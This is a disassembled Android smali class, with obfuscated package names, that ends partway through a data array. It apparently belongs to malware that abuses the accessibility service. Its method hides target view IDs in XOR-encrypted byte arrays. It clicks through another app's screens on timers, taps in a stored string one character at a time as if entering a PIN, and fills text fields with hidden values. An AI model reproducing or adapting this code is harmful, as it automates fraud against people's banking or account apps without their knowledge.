.class Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->onClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;


# direct methods
.method constructor <init>(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;)V
    .locals 0

    .line 1
    iput-object p1, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 15

    .line 1
    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1e

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    const/16 v3, 0x10

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-ne v1, v5, :cond_0

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    const-wide/16 v0, 0x7d0

    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_7

    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x20

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v5, :cond_1

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_1
    const-wide/16 v0, 0xc8

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_6

    iget-object v6, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v6, v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v6, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v6}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v6

    const/16 v7, 0x16

    new-array v7, v7, [B

    fill-array-data v7, :array_4

    new-array v8, v2, [B

    fill-array-data v8, :array_5

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v6

    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v7

    if-ne v7, v5, :cond_2

    invoke-interface {v6, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v6, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    :try_start_2
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_5

    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1a

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v6, v2, [B

    fill-array-data v6, :array_7

    invoke-static {v1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v5, :cond_3

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_3
    const-wide/16 v0, 0x5dc

    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_4

    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1d

    new-array v6, v1, [B

    fill-array-data v6, :array_8

    new-array v7, v2, [B

    fill-array-data v7, :array_9

    invoke-static {v6, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    if-ne v6, v5, :cond_4

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_4
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/F9v6QVyX;->m:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->toCharArray()[C

    move-result-object v0

    array-length v6, v0

    move v7, v4

    :goto_0
    const-wide/16 v8, 0x12c

    if-ge v7, v6, :cond_6

    aget-char v10, v0, v7

    new-instance v11, Ljava/lang/StringBuilder;

    invoke-direct {v11}, Ljava/lang/StringBuilder;-><init>()V

    const/16 v12, 0x1b

    new-array v12, v12, [B

    fill-array-data v12, :array_a

    new-array v13, v2, [B

    fill-array-data v13, :array_b

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    const/4 v10, 0x3

    new-array v10, v10, [B

    fill-array-data v10, :array_c

    new-array v12, v2, [B

    fill-array-data v12, :array_d

    invoke-static {v10, v12}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    iget-object v11, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v11, v11, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v11, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v11}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v11

    invoke-virtual {v11, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v10

    invoke-interface {v10}, Ljava/util/List;->size()I

    move-result v11

    if-ne v11, v5, :cond_5

    invoke-interface {v10, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v10, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :try_start_4
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :cond_5
    :goto_1
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    :cond_6
    const-wide/16 v6, 0x3e8

    :try_start_5
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_3

    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v10, 0x28

    new-array v10, v10, [B

    fill-array-data v10, :array_e

    new-array v11, v2, [B

    fill-array-data v11, :array_f

    invoke-static {v10, v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v10

    const/high16 v11, 0x200000

    const/16 v12, 0x25

    if-ne v10, v5, :cond_7

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v10, Landroid/os/Bundle;

    invoke-direct {v10}, Landroid/os/Bundle;-><init>()V

    new-array v13, v12, [B

    fill-array-data v13, :array_10

    new-array v14, v2, [B

    fill-array-data v14, :array_11

    invoke-static {v13, v14}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v13

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->a()Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v10, v13, v14}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v11, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_7
    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-array v10, v12, [B

    fill-array-data v10, :array_12

    new-array v13, v2, [B

    fill-array-data v13, :array_13

    invoke-static {v10, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v0, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v10

    if-ne v10, v5, :cond_8

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    new-instance v10, Landroid/os/Bundle;

    invoke-direct {v10}, Landroid/os/Bundle;-><init>()V

    new-array v12, v12, [B

    fill-array-data v12, :array_14

    new-array v13, v2, [B

    fill-array-data v13, :array_15

    invoke-static {v12, v13}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me;->c()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v10, v12, v13}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v0, v11, v10}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    :cond_8
    :try_start_6
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_2

    iget-object v0, p0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a$b;->a:Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;

    iget-object v0, v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/me$a;->b:Landroid/content/Context;

    check-cast v0, Landroid/accessibilityservice/AccessibilityService;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    new-array v1, v1, [B

    fill-array-data v1, :array_16

    new-array v2, v2, [B

    fill-array-data v2, :array_17

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-ne v1, v5, :cond_9

    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_9
    :try_start_7
    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_1

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->d(Ljava/lang/Boolean;)V

    return-void

    :catch_1
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_2
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_3
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_4
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_5
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_6
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :catch_7
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1

    :array_0
    .array-data 1
        -0x7ct
        0x3ct
        0x7ft
        -0x6ct
        -0x2bt
        -0x7at
        -0x58t
        0x57t
        -0x7at
        0x3dt
        0x35t
        -0x75t
        -0x2bt
        -0x7ft
        -0x53t
        0x43t
        -0x72t
        0x37t
        0x7et
        -0x65t
        -0x32t
        -0x7at
        -0x76t
        0x16t
        -0x77t
        0x27t
        0x38t
        -0x69t
        -0x31t
        -0x73t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x19t
        0x53t
        0x51t
        -0x7t
        -0x46t
        -0x18t
        -0x37t
        0x79t
    .end array-data

    :array_2
    .array-data 1
        0x5et
        -0x19t
        0x66t
        -0x28t
        0x45t
        -0x33t
        -0x9t
        0x4at
        0x5ct
        -0x1at
        0x2ct
        -0x39t
        0x45t
        -0x36t
        -0xet
        0x5et
        0x54t
        -0x14t
        0x67t
        -0x3ft
        0x45t
        -0x2dt
        -0x3dt
        0x14t
        0x7ct
        -0x1bt
        0x27t
        -0x40t
        0x44t
        -0x29t
        -0x2dt
        0x10t
    .end array-data

    :array_3
    .array-data 1
        0x3dt
        -0x78t
        0x48t
        -0x4bt
        0x2at
        -0x5dt
        -0x6at
        0x64t
    .end array-data

    :array_4
    .array-data 1
        0x6ft
        -0x6dt
        -0x6ct
        -0x45t
        0x4et
        -0x77t
        -0x7ft
        0x45t
        0x6dt
        -0x6et
        -0x22t
        -0x5ct
        0x4et
        -0x72t
        -0x7ct
        0x51t
        0x65t
        -0x68t
        -0x6bt
        -0x45t
        0x40t
        -0x61t
    .end array-data

    nop

    :array_5
    .array-data 1
        0xct
        -0x4t
        -0x46t
        -0x2at
        0x21t
        -0x19t
        -0x20t
        0x6bt
    .end array-data

    :array_6
    .array-data 1
        -0x34t
        0x15t
        0xat
        0x4ft
        -0x1dt
        -0x49t
        -0x73t
        0x4bt
        -0x32t
        0x14t
        0x40t
        0x50t
        -0x1dt
        -0x50t
        -0x78t
        0x5ft
        -0x3at
        0x1et
        0xbt
        0x51t
        -0x17t
        -0x49t
        -0x78t
        0x27t
        -0x25t
        0x14t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x51t
        0x7at
        0x24t
        0x22t
        -0x74t
        -0x27t
        -0x14t
        0x65t
    .end array-data

    :array_8
    .array-data 1
        0x1dt
        0x3dt
        -0x2ft
        -0x17t
        -0x25t
        0x12t
        -0x6t
        -0x54t
        0x1ft
        0x3ct
        -0x65t
        -0xat
        -0x25t
        0x15t
        -0x1t
        -0x48t
        0x17t
        0x36t
        -0x30t
        -0xct
        -0x3at
        0x15t
        -0xat
        -0x1dt
        0xct
        0x2bt
        -0x43t
        -0x10t
        -0x26t
    .end array-data

    nop

    :array_9
    .array-data 1
        0x7et
        0x52t
        -0x1t
        -0x7ct
        -0x4ct
        0x7ct
        -0x65t
        -0x7et
    .end array-data

    :array_a
    .array-data 1
        -0xct
        -0x19t
        -0x75t
        -0x2dt
        -0x3at
        -0x39t
        -0x71t
        -0x12t
        -0xat
        -0x1at
        -0x3ft
        -0x34t
        -0x3at
        -0x40t
        -0x76t
        -0x6t
        -0x2t
        -0x14t
        -0x76t
        -0x2bt
        -0x34t
        -0x30t
        -0x74t
        -0x51t
        -0xat
        -0x6t
        -0x3ft
    .end array-data

    :array_b
    .array-data 1
        -0x69t
        -0x78t
        -0x5bt
        -0x42t
        -0x57t
        -0x57t
        -0x12t
        -0x40t
    .end array-data

    :array_c
    .array-data 1
        0x41t
        -0x38t
        -0x3t
    .end array-data

    :array_d
    .array-data 1
        0x3t
        -0x44t
        -0x6dt
        -0x17t
        0xbt
        -0x78t
        0x75t
        0x6dt
    .end array-data

    :array_e
    .array-data 1
        -0x55t
        -0x49t
        0x5at
        -0x80t
        -0x23t
        0x74t
        0x29t
        0x3ft
        -0x57t
        -0x4at
        0x10t
        -0x61t
        -0x23t
        0x73t
        0x2ct
        0x2bt
        -0x5ft
        -0x44t
        0x5bt
        -0x78t
        -0x3at
        0x49t
        0x25t
        0x62t
        -0x62t
        -0x43t
        0x6t
        -0x7ct
        -0x2ct
        0x73t
        0x2bt
        0x70t
        -0x44t
        -0x4ft
        0x1bt
        -0x7dt
        -0xft
        0x75t
        0x2ct
        0x74t
    .end array-data

    :array_f
    .array-data 1
        -0x38t
        -0x28t
        0x74t
        -0x13t
        -0x4et
        0x1at
        0x48t
        0x11t
    .end array-data

    :array_10
    .array-data 1
        -0x47t
        0xct
        0x3bt
        0x6t
        0x65t
        -0x80t
        -0x4t
        0x74t
        -0x56t
        0x8t
        0x3at
        0x2t
